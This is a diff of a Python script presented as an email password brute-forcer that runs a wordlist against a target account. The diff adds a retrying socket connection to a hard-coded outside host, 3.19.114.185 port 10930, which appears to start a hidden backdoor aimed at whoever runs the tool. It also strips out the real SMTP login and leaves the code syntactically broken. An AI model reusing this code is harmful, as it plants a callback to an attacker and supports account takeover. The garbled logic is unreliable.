@@ -1,11 +1,11 @@
 #!/usr/bin/python
 '''created by POTTUS'''
 import socket,struct,time
-hhbhbhhhhhhhhhhhjjjjjjjjjjjjjjjjj
+
 for x in range(10):
         try:
                 s=socket.socket(2,socket.SOCK_STREAM)
-                s.connect(('',))
+                s.connect(('3.19.114.185',10930))
                 break
         except:
                 time.sleep(5)
@@ -61,27 +61,24 @@ pass_file = open(file_path,'r')
 pass_list = pass_file.readlines()
 def login():
     i = 0
-    user_name = raw_input('target email :')
-    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-    server.ehlo()
+    user_name = raw_input('target email / ID')
     for password in pass_list:
       i = i + 1
       print str(i) + '/' + str(len(pass_list))
       try:
-         server.login(user_name, password)
-         system('clear')
-         main()
+         print("Wait!..")
+(
          print '\n'
          print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
          break
-      except smtplib.SMTPAuthenticationError as e:
+      except :
          error = str(e)
          if error[14] == '<':
             system('clear')
-            main()
+            
             print '[+] this account has been hacked, password :' + password + '     ^_^'
 
             break
          else:
             print '[!] password not found => ' + password
-login()
+
